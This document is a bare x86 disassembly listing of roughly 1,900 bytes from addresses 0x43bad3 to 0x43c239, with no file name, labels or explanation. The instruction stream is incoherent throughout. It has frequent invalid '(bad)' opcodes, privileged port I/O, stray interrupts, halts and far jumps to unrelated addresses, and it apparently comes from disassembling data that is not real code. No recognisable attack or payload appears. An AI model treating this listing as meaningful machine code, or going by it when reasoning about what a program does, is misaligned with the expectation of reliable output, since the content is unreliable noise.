  43bad3:	aam    0x84
  43bad5:	and    DWORD PTR [ecx-0x37],ecx
  43bad8:	mov    dh,0x18
  43bada:	cmp    eax,0xd1c8caed
  43badf:	or     al,0x57
  43bae1:	mov    ecx,0x59986033
  43bae6:	nop
  43bae7:	and    BYTE PTR [esi+0xc8a9fd4],ch
  43baed:	(bad)  
  43baee:	cmp    al,0x2c
  43baf0:	fstp   QWORD PTR [edx-0x44e9a0e8]
  43baf6:	sub    BYTE PTR [ecx-0xf],0x50
  43bafa:	jmp    0x81ab67d7
  43baff:	stos   DWORD PTR es:[edi],eax
  43bb00:	sub    cl,BYTE PTR [ebx+0x28]
  43bb03:	sub    eax,ebp
  43bb05:	xchg   ecx,eax
  43bb06:	cmp    BYTE PTR [edx-0x17],bh
  43bb09:	and    al,0x77
  43bb0b:	or     al,0xfb
  43bb0d:	push   esi
  43bb0e:	adc    ah,BYTE PTR [ecx-0x43]
  43bb11:	inc    esi
  43bb12:	pusha  
  43bb13:	in     al,dx
  43bb14:	fwait
  43bb15:	in     al,dx
  43bb16:	es icebp 
  43bb18:	outs   dx,DWORD PTR ds:[esi]
  43bb19:	test   BYTE PTR [ebx-0x595952b6],dh
  43bb1f:	dec    eax
  43bb20:	imul   esi,esi,0x65
  43bb23:	imul   eax,edi,0x49
  43bb26:	and    edx,edi
  43bb28:	daa    
  43bb29:	sub    DWORD PTR [esi],0xd09c8170
  43bb2f:	mov    es,WORD PTR [edi+0x98a483c]
  43bb35:	lods   al,BYTE PTR ds:[esi]
  43bb36:	cwde   
  43bb37:	or     cl,BYTE PTR [eax+0x5]
  43bb3a:	(bad)  
  43bb3b:	repz pushf 
  43bb3d:	imul   edi,DWORD PTR [edi-0x46],0x1debea9c
  43bb44:	pop    edi
  43bb45:	sub    al,0x62
  43bb47:	dec    esp
  43bb48:	loopne 0x43bbac
  43bb4a:	out    0x3d,al
  43bb4c:	mov    ecx,0x67d8d777
  43bb51:	outs   dx,BYTE PTR ds:[esi]
  43bb52:	inc    ebx
  43bb53:	sub    ebx,edi
  43bb55:	adc    eax,0x78694d49
  43bb5a:	cmovg  edx,DWORD PTR [eax]
  43bb5d:	or     bh,BYTE PTR [esi-0x41]
  43bb60:	push   edx
  43bb61:	imul   edi,DWORD PTR [edx-0x1],0xdaad972e
  43bb68:	fnstcw WORD PTR [ebp-0x7787b593]
  43bb6e:	ret    0xddaa
  43bb71:	mov    ch,0x9e
  43bb73:	int3   
  43bb74:	leave  
  43bb75:	cmp    eax,0xd6e2a695
  43bb7a:	retf   
  43bb7b:	cli    
  43bb7c:	enter  0x8dcc,0x30
  43bb80:	jmp    0x930ab2f9
  43bb85:	dec    esi
  43bb86:	sbb    DWORD PTR [esi],0xffffffa8
  43bb89:	in     eax,0x1
  43bb8b:	jb     0x43bc08
  43bb8d:	fld    st(6)
  43bb8f:	je     0x43bb84
  43bb91:	mov    bl,0x53
  43bb93:	fild   DWORD PTR [esi-0x48a3be9e]
  43bb99:	stc    
  43bb9a:	xchg   esi,eax
  43bb9b:	cmc    
  43bb9c:	ret    0xf5d7
  43bb9f:	lds    esi,FWORD PTR [ebp-0x30499c8c]
  43bba5:	cs nop
  43bba7:	jmp    FWORD PTR [eax+0x1d]
  43bbaa:	xchg   bp,ax
  43bbac:	jmp    0x9b66:0xe78de8c7
  43bbb3:	loope  0x43bb77
  43bbb5:	xchg   esp,eax
  43bbb6:	int    0x82
  43bbb8:	sbb    DWORD PTR [edx-0x49216559],edi
  43bbbe:	xchg   edx,eax
  43bbbf:	int    0x8e
  43bbc1:	test   DWORD PTR [esi-0x4f2e2d67],ebx
  43bbc7:	xor    BYTE PTR [eax+0x45],al
  43bbca:	loop   0x43bc2a
  43bbcc:	pop    eax
  43bbcd:	int    0x5a
  43bbcf:	cld    
  43bbd0:	add    dl,dl
  43bbd2:	or     DWORD PTR [edx+edi*2],edi
  43bbd5:	mov    ds:0x2cae7f63,al
  43bbda:	lock push eax
  43bbdc:	inc    esi
  43bbdd:	fidivr WORD PTR [edx-0xb799c6]
  43bbe3:	adc    edx,eax
  43bbe5:	push   esi
  43bbe6:	mov    WORD PTR [ecx+0x228b18a9],?
  43bbec:	repnz addr16 test al,0x48
  43bbf0:	jne    0x43bbe2
  43bbf2:	clc    
  43bbf3:	and    BYTE PTR [ebx-0x2ddfeb0e],dh
  43bbf9:	cmc    
  43bbfa:	inc    esi
  43bbfb:	aam    0x29
  43bbfd:	outs   dx,DWORD PTR ds:[esi]
  43bbfe:	or     bl,ch
  43bc00:	aad    0xaa
  43bc02:	jnp    0x43bbbc
  43bc04:	mov    esp,0x9f864ceb
  43bc09:	sti    
  43bc0a:	sub    al,0x77
  43bc0c:	test   al,0x51
  43bc0e:	jle    0x43bbab
  43bc10:	fcomp  st(5)
  43bc12:	int    0xee
  43bc14:	cmp    ebx,ebp
  43bc16:	mov    dh,0x5e
  43bc18:	mov    cl,BYTE PTR [edx+0x75]
  43bc1b:	push   cs
  43bc1c:	lahf   
  43bc1d:	mov    al,ds:0xafc03451
  43bc22:	rol    BYTE PTR [ebp+0x49],0x6a
  43bc26:	mov    edx,0x4c8d92b2
  43bc2b:	cmp    eax,0x40352839
  43bc30:	mov    ds:0x67d2cc29,al
  43bc35:	popa   
  43bc36:	pop    ss
  43bc37:	(bad)  
  43bc38:	jl     0x43bc67
  43bc3a:	mov    eax,edx
  43bc3c:	push   ecx
  43bc3d:	nop
  43bc3e:	add    ah,BYTE PTR [esp+eax*8-0x3a]
  43bc42:	pop    es
  43bc43:	mul    DWORD PTR [ebx]
  43bc45:	out    dx,eax
  43bc46:	mov    al,0x9c
  43bc48:	mov    ds,WORD PTR [ebx-0x20]
  43bc4b:	std    
  43bc4c:	test   BYTE PTR [ecx+0x65],cl
  43bc4f:	or     DWORD PTR [ebx],0xa3cc1e12
  43bc55:	fst    QWORD PTR [ecx-0x493c0519]
  43bc5b:	xchg   edi,eax
  43bc5c:	and    BYTE PTR [edi+0x59c4aa1c],cl
  43bc62:	leave  
  43bc63:	out    0x26,eax
  43bc65:	sub    eax,0x557d66e8
  43bc6a:	ror    DWORD PTR [ebx+0x28e59f8f],cl
  43bc70:	adc    DWORD PTR fs:[edi-0x65],edx
  43bc74:	jl     0x43bc51
  43bc76:	jge    0x43bc00
  43bc78:	(bad)  
  43bc79:	xor    ah,ch
  43bc7b:	fwait
  43bc7c:	adc    ah,al
  43bc7e:	lock popf 
  43bc80:	push   eax
  43bc81:	sti    
  43bc82:	aad    0x2e
  43bc84:	and    eax,0xc0dbe0bd
  43bc89:	shl    DWORD PTR [esi-0x2129f160],cl
  43bc8f:	mov    edi,0x1f71b8b8
  43bc94:	lds    eax,FWORD PTR [esi-0x13]
  43bc97:	xor    dl,BYTE PTR [edx]
  43bc99:	fwait
  43bc9a:	and    DWORD PTR [edi],edx
  43bc9c:	ret    0xbd70
  43bc9f:	sbb    ecx,DWORD PTR [ebx+0x17]
  43bca2:	or     DWORD PTR [edx],ecx
  43bca4:	xchg   ebx,eax
  43bca5:	push   ds
  43bca6:	aam    0x55
  43bca8:	addr16 push es
  43bcaa:	and    eax,0xab077f9f
  43bcaf:	mov    edx,0xde28d4e0
  43bcb4:	lea    ecx,[eax*2+0x1788d630]
  43bcbb:	out    dx,eax
  43bcbc:	pop    ebp
  43bcbd:	int    0x35
  43bcbf:	sub    BYTE PTR [ecx-0x1f],ch
  43bcc2:	cli    
  43bcc3:	stc    
  43bcc4:	xchg   edi,eax
  43bcc5:	ds jecxz 0x43bca0
  43bcc8:	cmp    eax,0x19d4cf63
  43bccd:	aaa    
  43bcce:	fnsave [edx+0x431c2c63]
  43bcd4:	ds mov ch,0x33
  43bcd7:	push   edx
  43bcd8:	push   ebx
  43bcd9:	inc    ecx
  43bcda:	ds in  eax,0x96
  43bcdd:	call   0xd782323f
  43bce2:	mov    ds:0x205e3974,al
  43bce7:	mov    al,ds:0xf81a7216
  43bcec:	inc    eax
  43bced:	xor    al,0x66
  43bcef:	outs   dx,BYTE PTR ds:[esi]
  43bcf0:	ficom  WORD PTR [edx+0x79]
  43bcf3:	(bad)  
  43bcf4:	xor    DWORD PTR [edi],edx
  43bcf6:	push   esi
  43bcf7:	stos   DWORD PTR es:[edi],eax
  43bcf8:	jmp    0x9f2dbd18
  43bcfd:	xchg   edi,eax
  43bcfe:	push   edi
  43bcff:	or     ch,BYTE PTR [edx]
  43bd01:	(bad)  
  43bd02:	out    dx,al
  43bd03:	pop    ss
  43bd04:	push   ds
  43bd05:	push   es
  43bd06:	loopne 0x43bc8e
  43bd08:	scas   al,BYTE PTR es:[edi]
  43bd09:	in     al,dx
  43bd0a:	or     BYTE PTR [ebp+0x5f],ah
  43bd0d:	sbb    eax,0x4441d8f0
  43bd12:	call   0x75a1849b
  43bd17:	mov    al,ds:0xd82e1a20
  43bd1c:	sbb    al,0x38
  43bd1e:	mov    ds:0x278bb7b4,eax
  43bd23:	fidivr DWORD PTR [edi+ebx*2+0x39]
  43bd27:	loope  0x43bd36
  43bd29:	leave  
  43bd2a:	push   0xffffffec
  43bd2c:	xor    al,0x8b
  43bd2e:	(bad)  
  43bd2f:	mov    ah,0x83
  43bd31:	(bad)  
  43bd32:	(bad)  
  43bd33:	rcr    cl,cl
  43bd35:	xchg   ebp,eax
  43bd36:	adc    esp,DWORD PTR [ebx]
  43bd38:	or     eax,0xc6ae59f4
  43bd3d:	test   eax,0xbb4f809b
  43bd42:	cdq    
  43bd43:	in     al,dx
  43bd44:	ins    BYTE PTR es:[edi],dx
  43bd45:	cwde   
  43bd46:	outs   dx,BYTE PTR ds:[esi]
  43bd47:	int    0xfb
  43bd49:	xchg   esp,eax
  43bd4a:	sbb    al,0x5a
  43bd4c:	dec    edi
  43bd4d:	stos   BYTE PTR es:[edi],al
  43bd4e:	aas    
  43bd4f:	fst    DWORD PTR [edi+0x4e71ebb9]
  43bd55:	cld    
  43bd56:	outs   dx,BYTE PTR ds:[esi]
  43bd57:	lods   eax,DWORD PTR ds:[esi]
  43bd58:	dec    esp
  43bd59:	(bad)
  43bd5c:	jecxz  0x43bd74
  43bd5e:	ret    
  43bd5f:	ja     0x43bdaf
  43bd61:	shr    DWORD PTR [eax-0x5dee126d],cl
  43bd67:	sbb    edx,0xde436953
  43bd6d:	mov    ebx,0x6ef93c67
  43bd72:	test   DWORD PTR [ebp+0x2a],esp
  43bd75:	cdq    
  43bd76:	sub    ebx,ebp
  43bd78:	push   edx
  43bd79:	cmp    BYTE PTR [ecx+0x11],ch
  43bd7c:	mov    edi,0x8bcd3a02
  43bd81:	fimul  DWORD PTR [edx-0x5e]
  43bd84:	mov    DWORD PTR [esi],esp
  43bd86:	jnp    0x43bd4b
  43bd88:	push   esp
  43bd89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bd8a:	test   bh,dh
  43bd8c:	int3   
  43bd8d:	inc    edi
  43bd8e:	mov    eax,0x6b240a5a
  43bd93:	add    ch,BYTE PTR [ecx-0x1d]
  43bd96:	xor    al,0x67
  43bd98:	mov    ch,0x7b
  43bd9a:	(bad)  
  43bd9b:	mov    eax,0x87a3b49
  43bda0:	inc    eax
  43bda1:	inc    ebx
  43bda2:	push   edi
  43bda3:	jmp    0x77957ed6
  43bda8:	in     eax,dx
  43bda9:	sbb    BYTE PTR [ebx-0x1],dl
  43bdac:	clc    
  43bdad:	(bad)  
  43bdae:	pop    ds
  43bdaf:	adc    BYTE PTR [eax],ah
  43bdb1:	add    BYTE PTR [eax],0x25
  43bdb4:	xor    DWORD PTR [ebx+0x25],0x88c89234
  43bdbb:	movaps xmm7,xmm1
  43bdbe:	popa   
  43bdbf:	outs   dx,DWORD PTR ds:[esi]
  43bdc0:	jbe    0x43be1c
  43bdc2:	(bad)  [eax]
  43bdc4:	pop    edi
  43bdc5:	jmp    0xb346:0x3f83904
  43bdcc:	mov    bl,0x2c
  43bdce:	sub    ch,bh
  43bdd0:	pop    ebp
  43bdd1:	mov    bl,0xb4
  43bdd3:	stos   DWORD PTR es:[edi],eax
  43bdd4:	in     al,0x2e
  43bdd6:	mov    edx,0x8e727b2e
  43bddb:	dec    ebx
  43bddc:	repz sub BYTE PTR [eiz*4-0x4ad2a897],dl
  43bde4:	(bad)  
  43bde5:	shl    DWORD PTR [edx-0x2a657df2],0x18
  43bdec:	mov    cl,0x52
  43bdee:	xlat   BYTE PTR ds:[ebx]
  43bdef:	and    al,BYTE PTR [eax+eiz*2]
  43bdf2:	sbb    ah,bh
  43bdf4:	(bad)  
  43bdf5:	dec    edi
  43bdf6:	xchg   esp,eax
  43bdf7:	add    BYTE PTR [edx-0xb78d26b],bl
  43bdfd:	mov    dl,BYTE PTR [eax]
  43bdff:	ins    BYTE PTR es:[edi],dx
  43be00:	xchg   esi,eax
  43be01:	push   esp
  43be02:	imul   edx,esp,0xffffffda
  43be05:	cdq    
  43be06:	inc    esi
  43be07:	repnz xchg ebx,eax
  43be09:	mov    ?,WORD PTR [bx+0x45]
  43be0d:	xchg   DWORD PTR [edi+0xf],esp
  43be10:	(bad)  
  43be11:	cli    
  43be12:	fisubr DWORD PTR [ebx]
  43be14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43be15:	xchg   ecx,eax
  43be16:	ffreep st(5)
  43be18:	jb     0x43bdc6
  43be1a:	ja     0x43be10
  43be1c:	push   esp
  43be1d:	imul   esp,DWORD PTR [ebx+0x80e648a],0x8c9bb2da
  43be27:	scas   eax,DWORD PTR es:[edi]
  43be28:	loopne 0x43be79
  43be2a:	loopne 0x43be64
  43be2c:	es aas 
  43be2e:	jno    0x43be49
  43be30:	inc    ecx
  43be31:	sub    edx,edi
  43be33:	mov    dl,0x60
  43be35:	loop   0x43be99
  43be37:	test   BYTE PTR [eax],0xe
  43be3a:	xchg   DWORD PTR [eax+0x56e4d5f9],eax
  43be40:	push   ds
  43be41:	jno    0x43bea7
  43be43:	pusha  
  43be44:	mov    bh,BYTE PTR ds:0x3cb7474
  43be4a:	mov    ch,ch
  43be4c:	mov    al,0x8b
  43be4e:	sub    ecx,DWORD PTR [edi+0x76ea63ca]
  43be54:	or     al,0x6f
  43be56:	mov    ecx,0xa909582d
  43be5b:	dec    edx
  43be5c:	cmp    ah,0x76
  43be5f:	jbe    0x43bea5
  43be61:	repz lds eax,FWORD PTR [ebx+ebx*8+0x29]
  43be66:	ss enter 0xd837,0x63
  43be6b:	push   ss
  43be6c:	sub    ch,bl
  43be6e:	push   ecx
  43be6f:	dec    edi
  43be70:	push   0x5add9b69
  43be75:	sbb    esp,DWORD PTR [esi+0x2b]
  43be78:	dec    esi
  43be79:	mov    ah,0xd6
  43be7b:	cwde   
  43be7c:	into   
  43be7d:	sbb    esi,edx
  43be7f:	outs   dx,BYTE PTR ds:[esi]
  43be80:	mov    eax,0xde9a1dd1
  43be85:	aaa    
  43be86:	mov    DWORD PTR ds:0x3cab28f4,eax
  43be8c:	add    cl,BYTE PTR ds:0x70aa2a58
  43be92:	pop    ecx
  43be93:	add    DWORD PTR [edx+0x6ebf480c],ebp
  43be99:	pcmpeqd mm7,QWORD PTR [edx+eax*4]
  43be9d:	add    DWORD PTR [esi+edi*2],0xffffffaa
  43bea1:	xor    eax,0x70a990b6
  43bea6:	sub    cl,BYTE PTR [esi+0x27]
  43bea9:	stc    
  43beaa:	xor    eax,0x8c01b3fa
  43beaf:	push   es
  43beb0:	scas   al,BYTE PTR es:[edi]
  43beb1:	push   ds
  43beb2:	in     al,0x3f
  43beb4:	adc    ecx,DWORD PTR [ebp-0x60166440]
  43beba:	(bad)  
  43bebc:	fs out 0x3a,al
  43bebf:	aaa    
  43bec0:	push   ebp
  43bec1:	pushf  
  43bec2:	daa    
  43bec3:	nop
  43bec4:	cmp    al,0xb2
  43bec6:	cmp    eax,0x34d14f96
  43becb:	btc    DWORD PTR [edx+0x52dcf3a6],eax
  43bed2:	(bad)  
  43bed3:	test   eax,0x613c46bf
  43bed8:	adc    al,0xaa
  43beda:	add    ch,BYTE PTR [eax-0x11]
  43bedd:	adc    eax,0xad35a153
  43bee2:	mov    dl,0xda
  43bee4:	das    
  43bee5:	jo     0x43bef0
  43bee7:	inc    eax
  43bee8:	mov    DWORD PTR [ecx],edi
  43beea:	cmp    DWORD PTR [ecx-0x4589eb3e],edx
  43bef0:	inc    BYTE PTR [edx]
  43bef2:	add    edi,edi
  43bef4:	mov    ebp,0xe174a7e2
  43bef9:	lahf   
  43befa:	jnp    0x43bf71
  43befc:	outs   dx,BYTE PTR ds:[esi]
  43befd:	ror    BYTE PTR [edx],cl
  43beff:	adc    ebx,DWORD PTR [edi-0x29c99d92]
  43bf05:	push   ebx
  43bf06:	aas    
  43bf07:	rol    DWORD PTR [ebx+0x71],0x59
  43bf0b:	stos   DWORD PTR es:[edi],eax
  43bf0c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43bf0d:	imul   bl
  43bf0f:	pusha  
  43bf10:	(bad)  
  43bf11:	mov    ecx,0x4bcddb72
  43bf16:	test   DWORD PTR [ebx+0x2d2bca15],esi
  43bf1c:	repnz mov esp,esi
  43bf1f:	xchg   bh,dh
  43bf21:	sub    edx,DWORD PTR [edi-0x5f]
  43bf24:	fwait
  43bf25:	dec    edi
  43bf26:	or     ecx,ebp
  43bf28:	add    al,0xa2
  43bf2a:	(bad)  
  43bf2b:	mov    cl,0xf0
  43bf2d:	retf   0x14c8
  43bf30:	loopne 0x43bf6d
  43bf32:	pop    ds
  43bf33:	out    0x4f,al
  43bf35:	cmp    al,0x35
  43bf37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bf38:	mov    edi,0xbae17e5a
  43bf3d:	sub    al,0x7a
  43bf3f:	sahf   
  43bf40:	fsubrp st(0),st
  43bf42:	out    dx,eax
  43bf43:	sbb    eax,0xd7bd5123
  43bf48:	inc    edx
  43bf49:	xor    DWORD PTR [esi],ebx
  43bf4b:	dec    edi
  43bf4c:	int3   
  43bf4d:	and    esp,DWORD PTR [ecx-0x74]
  43bf50:	pop    ebx
  43bf51:	loopne 0x43bf3b
  43bf53:	xchg   esp,eax
  43bf54:	sbb    ebx,DWORD PTR [ecx-0x12803749]
  43bf5a:	dec    ebx
  43bf5b:	aam    0xe9
  43bf5d:	inc    eax
  43bf5e:	push   0x8c7df47b
  43bf63:	mov    ch,0x7d
  43bf65:	jmp    0x6c6b:0x82c6b6df
  43bf6c:	xchg   ebp,eax
  43bf6d:	add    al,al
  43bf6f:	dec    esi
  43bf70:	test   DWORD PTR [esp+eax*4],edi
  43bf73:	mov    WORD PTR [ebp+0x57],ss
  43bf76:	(bad)  
  43bf77:	lods   eax,DWORD PTR ds:[esi]
  43bf78:	stc    
  43bf79:	aad    0x48
  43bf7b:	lods   eax,DWORD PTR ds:[esi]
  43bf7c:	cli    
  43bf7d:	mov    ch,0x72
  43bf7f:	mov    al,0x49
  43bf81:	jp     0x43bf64
  43bf83:	push   ecx
  43bf84:	mov    esp,0xdd2c9b
  43bf89:	shr    DWORD PTR [edx],cl
  43bf8b:	fild   QWORD PTR [edx+0x1c961ab7]
  43bf91:	cld    
  43bf92:	pop    ss
  43bf93:	in     al,0x90
  43bf95:	out    dx,al
  43bf96:	pushf  
  43bf97:	add    eax,0x6b114d76
  43bf9c:	mov    ebx,ecx
  43bf9e:	sub    BYTE PTR ds:0xb09a16cb,bl
  43bfa4:	push   ecx
  43bfa5:	sbb    al,0x76
  43bfa7:	out    dx,eax
  43bfa8:	sub    eax,0xb818ac03
  43bfad:	mov    BYTE PTR [esi+0x2ed51102],dh
  43bfb3:	or     DWORD PTR ds:0x85b841b5,esp
  43bfb9:	xchg   edi,eax
  43bfba:	sub    ebp,DWORD PTR [edx-0xa641039]
  43bfc0:	out    dx,al
  43bfc1:	shl    BYTE PTR [esi-0x39],1
  43bfc4:	ret    
  43bfc5:	push   es
  43bfc6:	(bad)  
  43bfc7:	mov    edx,0xb32727d4
  43bfcc:	sbb    al,0x84
  43bfce:	pushf  
  43bfcf:	stos   BYTE PTR es:[edi],al
  43bfd0:	cmp    BYTE PTR [edx+0x47],0x70
  43bfd4:	adc    al,0xe4
  43bfd6:	ins    DWORD PTR es:[edi],dx
  43bfd7:	cmp    DWORD PTR [edi+0x19],0x8de200ac
  43bfde:	lock push edx
  43bfe0:	mov    cl,0x71
  43bfe2:	in     eax,0xcd
  43bfe4:	or     eax,0x8fac270f
  43bfe9:	aas    
  43bfea:	shr    BYTE PTR [eax+0x40],1
  43bfed:	inc    eax
  43bfee:	adc    eax,0x95939da3
  43bff3:	stos   DWORD PTR es:[edi],eax
  43bff4:	outs   dx,DWORD PTR cs:[esi]
  43bff6:	mov    DWORD PTR [ecx],edi
  43bff8:	jo     0xe3a051b8
  43bffe:	jecxz  0x43c041
  43c000:	push   edx
  43c001:	rcr    bl,1
  43c003:	outs   dx,DWORD PTR ds:[esi]
  43c004:	js     0x43c021
  43c006:	(bad)  
  43c008:	ds aas 
  43c00a:	popa   
  43c00b:	adc    esp,0xaf5a93e
  43c011:	pushf  
  43c012:	fmul   QWORD PTR [esp+ecx*1]
  43c015:	pop    esp
  43c016:	mov    bh,0x41
  43c018:	push   ss
  43c019:	push   es
  43c01a:	and    BYTE PTR [esp+edx*8+0x3],0xd9
  43c01f:	cmc    
  43c020:	lock lds eax,FWORD PTR [edi-0x60]
  43c024:	test   al,0xab
  43c026:	jns    0x43bff8
  43c028:	mov    ds:0x67b38731,al
  43c02d:	inc    eax
  43c02e:	int    0x57
  43c030:	out    dx,eax
  43c031:	daa    
  43c032:	add    ecx,DWORD PTR [ebx+0x2d]
  43c035:	rcr    BYTE PTR [ebp+0x7cbf319a],cl
  43c03b:	push   eax
  43c03c:	sahf   
  43c03d:	repnz adc DWORD PTR [eax+0x59],eax
  43c041:	jmp    0x38bb:0x869d4f78
  43c048:	cmp    BYTE PTR [eax+0x59],bh
  43c04b:	ja     0x43c06d
  43c04d:	fdiv   QWORD PTR [esi-0x5b47c417]
  43c053:	jo     0x43c079
  43c055:	jge    0x43bfee
  43c057:	pop    esi
  43c058:	fadd   QWORD PTR [ecx]
  43c05a:	push   0xd4a9cb4
  43c05f:	mov    ss,WORD PTR [eax+0x7e]
  43c062:	xor    eax,0x1946c2e6
  43c067:	push   es
  43c068:	adc    DWORD PTR [eax],esi
  43c06a:	mov    ebx,esp
  43c06c:	add    edx,DWORD PTR [ecx-0x10b5430f]
  43c072:	dec    eax
  43c073:	je     0x43c092
  43c075:	push   edx
  43c077:	pop    eax
  43c078:	lds    ebp,FWORD PTR [edi]
  43c07a:	(bad)  
  43c07b:	mov    ds:0xcada3413,eax
  43c080:	cmp    DWORD PTR [ecx+0x46],eax
  43c083:	out    dx,al
  43c084:	in     eax,dx
  43c085:	outs   dx,DWORD PTR ds:[esi]
  43c086:	in     al,dx
  43c087:	pop    esi
  43c088:	mov    ebp,0xf43fc5a5
  43c08d:	add    cl,BYTE PTR [ebx]
  43c08f:	sar    DWORD PTR [ebx-0x5d],cl
  43c092:	out    0x14,eax
  43c094:	push   ss
  43c095:	ret    0xccd4
  43c098:	sbb    esp,DWORD PTR [eax]
  43c09a:	fwait
  43c09b:	sahf   
  43c09c:	push   ss
  43c09d:	inc    edx
  43c09e:	pop    edx
  43c09f:	xor    BYTE PTR [eax-0x387db492],cl
  43c0a5:	(bad)  
  43c0a6:	mov    al,ds:0x1f6cbf45
  43c0ab:	ror    DWORD PTR [ebx-0x7ea33f68],1
  43c0b1:	rep ins DWORD PTR es:[edi],dx
  43c0b3:	add    esp,DWORD PTR [esi+0x1247546]
  43c0b9:	pusha  
  43c0ba:	nop
  43c0bb:	ins    DWORD PTR es:[edi],dx
  43c0bc:	inc    ecx
  43c0bd:	imul   esp,DWORD PTR [ecx],0xd14219fc
  43c0c3:	popf   
  43c0c4:	pushf  
  43c0c5:	cs jg  0x43c092
  43c0c8:	fstp   DWORD PTR [eax]
  43c0ca:	mov    ds:0x1d1d24c5,eax
  43c0cf:	nop
  43c0d0:	dec    esi
  43c0d1:	daa    
  43c0d2:	xchg   DWORD PTR [edi+0x13],esi
  43c0d5:	sbb    bl,BYTE PTR [ecx-0x2a74adbf]
  43c0db:	(bad)  
  43c0dc:	sub    al,0x97
  43c0de:	cmp    DWORD PTR ss:[edx],ebx
  43c0e1:	mov    ebp,0x4065a40c
  43c0e6:	or     al,0x67
  43c0e8:	xchg   edi,eax
  43c0e9:	ret    0x6f21
  43c0ec:	mov    ah,0xe0
  43c0ee:	mov    ebx,0x47c272ec
  43c0f3:	or     esi,DWORD PTR [ecx+0x5a6b9865]
  43c0f9:	test   ebp,ebp
  43c0fb:	jle    0x43c0d0
  43c0fd:	sub    edx,DWORD PTR [ebx-0x18]
  43c100:	push   ss
  43c101:	cmc    
  43c102:	sub    eax,0x878efe1b
  43c107:	div    DWORD PTR [eax+0x21]
  43c10a:	adc    eax,0xd65e951d
  43c10f:	mul    DWORD PTR [ebx+0xe]
  43c112:	inc    ebx
  43c113:	retf   
  43c114:	lods   eax,DWORD PTR ds:[esi]
  43c115:	shl    dl,1
  43c117:	push   edx
  43c118:	inc    edx
  43c119:	dec    DWORD PTR [ecx-0x2c548ac0]
  43c11f:	fisttp WORD PTR [esi]
  43c121:	fist   DWORD PTR [edx]
  43c123:	hlt    
  43c124:	shl    BYTE PTR [ebp+0x68],0x9a
  43c128:	add    esi,DWORD PTR ds:0x4899b41e
  43c12e:	pop    esp
  43c12f:	or     al,al
  43c131:	push   ebx
  43c132:	or     esp,DWORD PTR [eax]
  43c134:	scas   al,BYTE PTR es:[edi]
  43c135:	(bad)  
  43c137:	add    eax,0x79b2ff4a
  43c13c:	ja     0x43c0d1
  43c13e:	(bad)
  43c141:	mov    ds:0xf65ee6a6,eax
  43c146:	loope  0x43c151
  43c148:	mov    al,ds:0xa4b85819
  43c14d:	pop    eax
  43c14e:	lea    edx,[ebp+0xf]
  43c151:	aaa    
  43c152:	and    cl,BYTE PTR [ecx+edi*2-0x64]
  43c156:	or     al,0x87
  43c158:	dec    eax
  43c159:	xchg   ebx,eax
  43c15a:	sti    
  43c15b:	mov    bh,0x13
  43c15d:	stos   DWORD PTR es:[edi],eax
  43c15e:	jmp    0x3569:0x35e99c93
  43c165:	(bad)  
  43c166:	sub    al,0x4a
  43c168:	jbe    0x43c1df
  43c16a:	xchg   cl,ch
  43c16c:	sub    al,0xab
  43c16e:	adc    ebx,edi
  43c170:	pop    eax
  43c171:	push   es
  43c172:	cmp    dh,BYTE PTR [esi+0x2e]
  43c175:	popf   
  43c176:	push   esp
  43c177:	popa   
  43c178:	hlt    
  43c179:	in     al,0xf
  43c17b:	jae    0x43c158
  43c17d:	mov    edi,0x1a9b0ece
  43c182:	adc    al,0x11
  43c184:	(bad)  
  43c185:	loope  0x43c19b
  43c187:	std    
  43c188:	das    
  43c189:	lods   al,BYTE PTR ds:[esi]
  43c18a:	loope  0x43c17e
  43c18c:	pop    ebp
  43c18d:	cmp    ebp,DWORD PTR [edi]
  43c18f:	ins    DWORD PTR es:[edi],dx
  43c190:	repnz iret 
  43c192:	(bad)  
  43c193:	and    al,0x77
  43c195:	sub    eax,0xda8defe
  43c19a:	loop   0x43c12c
  43c19c:	(bad)
  43c1a0:	pop    es
  43c1a1:	(bad)  
  43c1a2:	imul   DWORD PTR [esi+0xb]
  43c1a5:	jnp    0x43c223
  43c1a7:	(bad)  
  43c1a8:	leave  
  43c1a9:	les    edx,FWORD PTR [ebx+0x4276ff7]
  43c1af:	mov    eax,0xf818e015
  43c1b4:	jecxz  0x43c175
  43c1b6:	aam    0xff
  43c1b8:	mov    ah,cl
  43c1ba:	inc    ebx
  43c1bb:	cmp    ah,BYTE PTR [ebp+0x5f925900]
  43c1c1:	enter  0x2791,0x1a
  43c1c5:	retf   0x728a
  43c1c8:	retf   0x389e
  43c1cb:	cmp    eax,0xab9e0fba
  43c1d0:	stc    
  43c1d1:	mov    al,0xcd
  43c1d3:	ins    DWORD PTR es:[edi],dx
  43c1d4:	fs dec eax
  43c1d6:	fdiv   st(0),st
  43c1d8:	scas   al,BYTE PTR es:[edi]
  43c1d9:	inc    ecx
  43c1da:	ss in  al,dx
  43c1dc:	aas    
  43c1dd:	pop    ss
  43c1de:	test   BYTE PTR [eax+0x43],bl
  43c1e1:	jl     0x43c24c
  43c1e3:	add    al,0x24
  43c1e5:	bound  ebp,QWORD PTR [ebp-0x5]
  43c1e8:	leave  
  43c1e9:	test   ch,ch
  43c1eb:	icebp  
  43c1ec:	imul   ecx,ebx,0x9167b0bd
  43c1f2:	dec    edx
  43c1f3:	dec    esi
  43c1f4:	clc    
  43c1f5:	jmp    0x43c260
  43c1f7:	adc    ebp,DWORD PTR [esi-0x1469256f]
  43c1fd:	frstor [edi]
  43c1ff:	lea    ecx,[ecx-0x33]
  43c202:	pop    ebp
  43c203:	jecxz  0x43c1bd
  43c205:	lds    ebp,FWORD PTR [ebx+ebx*1]
  43c208:	jmp    0x4de1d75d
  43c20d:	push   edi
  43c20e:	and    BYTE PTR [edi-0x73ae11d],bl
  43c214:	in     al,dx
  43c215:	jb     0x43c1e6
  43c217:	add    al,0x16
  43c219:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43c21a:	shl    BYTE PTR ds:0xe34e7532,1
  43c220:	pop    ecx
  43c221:	xor    ch,BYTE PTR [esi-0x2a]
  43c224:	push   edx
  43c225:	pop    edi
  43c226:	xor    BYTE PTR [ecx-0x6],0x1b
  43c22a:	xchg   esi,eax
  43c22b:	fs ja  0x43c21f
  43c22e:	daa    
  43c22f:	mov    edx,0x3e01162a
  43c234:	pop    edx
  43c235:	dec    ebp
  43c236:	jbe    0x43c22e
  43c238:	cld    
  43c239:	xor    al,0xff
